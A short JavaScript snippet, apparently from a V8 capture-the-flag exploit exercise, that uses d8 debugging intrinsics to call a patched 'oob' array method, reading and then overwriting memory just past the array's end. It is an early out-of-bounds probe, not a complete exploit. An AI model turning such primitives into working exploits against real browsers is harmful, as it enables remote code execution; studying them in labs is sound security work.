var a = [1,2,3, 1.1];
%DebugPrint(a);
%SystemBreak();
var data = a.oob();
console.log("[*] oob return data:" + data.toString());
%SystemBreak();
a.oob(2);
%SystemBreak();
